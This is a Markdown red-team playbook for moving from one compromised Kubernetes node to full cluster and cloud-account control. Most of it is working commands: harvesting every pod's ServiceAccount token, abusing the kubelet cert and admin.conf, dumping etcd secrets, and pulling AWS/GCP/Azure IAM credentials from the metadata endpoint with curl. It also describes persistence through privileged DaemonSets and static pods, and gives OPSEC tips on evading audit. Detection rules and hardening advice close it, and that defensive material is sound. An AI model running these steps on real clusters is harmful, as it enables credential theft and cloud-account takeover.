# Node → Cluster Pivot (Post-Escape Playbook)

ATT&CK: T1613 (Container & Resource Discovery), T1552.001 (Credentials in Files), T1552.005 (Cloud
Instance Metadata API), T1078.004 (Cloud Accounts), T1496 (Resource Hijacking) · CWE-552 (Files
Accessible to External Parties), CWE-522 (Insufficiently Protected Credentials), CWE-668.

You have host root on **one node** (via any path in the other references). This is the playbook to turn
one node into the whole cluster (and often the cloud account). Single-node compromise is rarely the
objective; the node is a credential and pivot reservoir.

## 1. Take inventory on the node

```bash
# you are root on the node (chroot /host or nsenter). Identify the runtime + every running pod:
crictl ps -a 2>/dev/null || ctr -n k8s.io c ls
crictl pods 2>/dev/null
# node identity & kube creds on disk:
ls -la /etc/kubernetes/                 # admin.conf on control-plane nodes == cluster-admin!
cat /var/lib/kubelet/pki/kubelet-client-current.pem    # node's client cert (system:node:<name>)
cat /var/lib/kubelet/config.yaml; cat /var/lib/kubelet/kubeconfig
```
`scripts/escape_enum.sh --node` (run after escape) dumps these locations and the cloud metadata.

## 2. Harvest every pod's ServiceAccount token on the node

Each pod on the node has its SA token on the host filesystem under the kubelet pods dir. Mining them
gives you the union of all those SAs' permissions:
```bash
find /var/lib/kubelet/pods -path '*/kubernetes.io/serviceaccount/token' 2>/dev/null \
  | while read t; do echo "== $t"; cat "$t"; echo; done
# or via the runtime: exec into each container and read its token
for c in $(crictl ps -q); do crictl exec "$c" cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null; done
```
Test each token with `kubectl auth can-i --list` (see k8s-rbac-escalation.md) — one of them frequently
maps to a controller/operator SA with cluster-wide rights.

## 3. Use the node's own identity (`system:node:<name>`)

The kubelet client cert lets you act as the node. The Node Authorizer normally restricts a node to its
own pods' secrets, but combined with stolen tokens or a misconfigured authorizer it reads secrets of
pods scheduled there — and on a **control-plane** node, `/etc/kubernetes/admin.conf` is cluster-admin:
```bash
KUBECONFIG=/etc/kubernetes/admin.conf kubectl get secrets -A          # control-plane node => game over
# worker node: use the kubelet cert
kubectl --client-certificate=/var/lib/kubelet/pki/kubelet-client-current.pem \
        --client-key=/var/lib/kubelet/pki/kubelet-client-current.pem \
        --server=https://<apiserver>:6443 get pods -A
```

## 4. Loot etcd (control-plane nodes)

etcd is the cluster's source of truth — every Secret, token, and config in plaintext (unless
encryption-at-rest is enabled):
```bash
export ETCDCTL_API=3
etcdctl --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets --prefix --keys-only        # then dump specific secrets
```

## 5. Steal the cloud role via IMDS (managed clusters)

On EKS/GKE/AKS the node carries an instance/role identity reachable on the metadata endpoint. Host
root (or hostNetwork) reaches IMDS even when pods are normally blocked:
```bash
# AWS (IMDSv2):
TOK=$(curl -s -X PUT http://169.254.169.254/latest/api/token \
      -H 'X-aws-ec2-metadata-token-ttl-seconds: 60')
ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOK" \
      http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s -H "X-aws-ec2-metadata-token: $TOK" \
      http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE   # AccessKey/Secret/Token
# GCP:  curl -s -H 'Metadata-Flavor: Google' \
#   http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
# Azure: curl -s -H Metadata:true \
#   'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/'
```
The node's IAM role often allows pulling from ECR, reading SSM params, assuming other roles, or
describing/launching EC2 — pivot to the cloud account (hand off to the cloud-security skill).

## 6. Spread to other nodes / persist

- Schedule a privileged DaemonSet (with cluster-admin) to land root on **every** node at once.
- Drop SSH keys / a static pod manifest in `/etc/kubernetes/manifests/` (the kubelet auto-runs static
  pods — a stealthy node-level persistence) — see red-team-ops for C2.
- Reuse harvested SA tokens against the API server from anywhere with network reachability.

## Detection

**API-server audit / cloud trail:**
```yaml
title: Mass Secret Enumeration or Node-Identity Abuse
logsource: { product: kubernetes, service: audit }
detection:
  secrets: { objectRef.resource: 'secrets', verb: ['list','get'] , objectRef.namespace: '' }
  node_user: { user.username|startswith: 'system:node:' }   # node cert listing cluster-wide secrets
  condition: secrets or node_user
level: high
```
- **Falco:** reads of `admin.conf`, etcd PKI, or multiple `serviceaccount/token` files; `crictl`/`ctr`
  exec from an unexpected process; `etcdctl get /registry/secrets`.
- **Cloud:** CloudTrail `AssumeRole`/`GetCallerIdentity` from a node role doing unusual actions; IMDS
  access from container-network ranges (deploy IMDSv2 + hop-limit 1; block pod→169.254.169.254).
- **IOCs:** static-pod manifests appearing in `/etc/kubernetes/manifests`; new privileged DaemonSet;
  `system:node:*` user listing secrets across namespaces; SA token reuse from new client IPs/user-agents.

## OPSEC

- Reading on-disk tokens/etcd is quiet (host-local file reads) until you *use* the creds against the
  API server, which is audited. Stagger and reuse legitimate-looking SAs to blend in.
- IMDS theft is logged in CloudTrail/equivalent the moment you call AWS/GCP/Azure APIs with the creds.
- A privileged DaemonSet and static-pod manifests are loud, durable footholds — use only when
  persistence outweighs stealth, and remember static pods don't appear in normal `kubectl get pods -A`
  scheduling history the same way (stealth bonus, but the manifest file is the IOC).
- Cleanup: remove static-pod manifests, DaemonSets, ClusterRoleBindings, SSH keys, and helper
  containers; rotate/abandon used tokens. etcd reads and API audit entries cannot be retracted.

## Defensive counterweight (blue-team validation)

- **Prevent escape reaching here:** enforce Pod Security Admission `restricted`, drop all caps,
  `runAsNonRoot`, read-only rootfs, seccomp `RuntimeDefault`, and **user namespaces** (blocks the procfs
  runc-2025 primitives). Keep runc/containerd/BuildKit/NCT patched (the CVE tables in the other refs).
- **Limit the blast radius:** least-privilege RBAC (audit `nodes/proxy`, `escalate`, `bind`, wildcard
  verbs), encryption-at-rest for etcd Secrets, Node Authorizer + NodeRestriction admission, and
  NetworkPolicy blocking pods from `:10250`, the admission webhooks, and `169.254.169.254`.
- **Detect:** Falco/Sysdig runtime rules from every reference here + API audit + cloud trail; alert on
  runtime/version drift and on the kubelet/nodes-proxy path that bypasses API audit.

## References

- MITRE ATT&CK for Containers (T1611/T1613/T1552); Microsoft "Threat matrix for Kubernetes."
- Kubernetes Docs — Node Authorization, NodeRestriction admission, encrypting Secret data at rest,
  static pods, Pod Security Standards.
- `inguardians/peirates` (K8s pivot), `aquasecurity/kube-hunter`, `cyberark/kubeletctl`; cloud-provider
  IMDS hardening guides (IMDSv2 / metadata concealment).
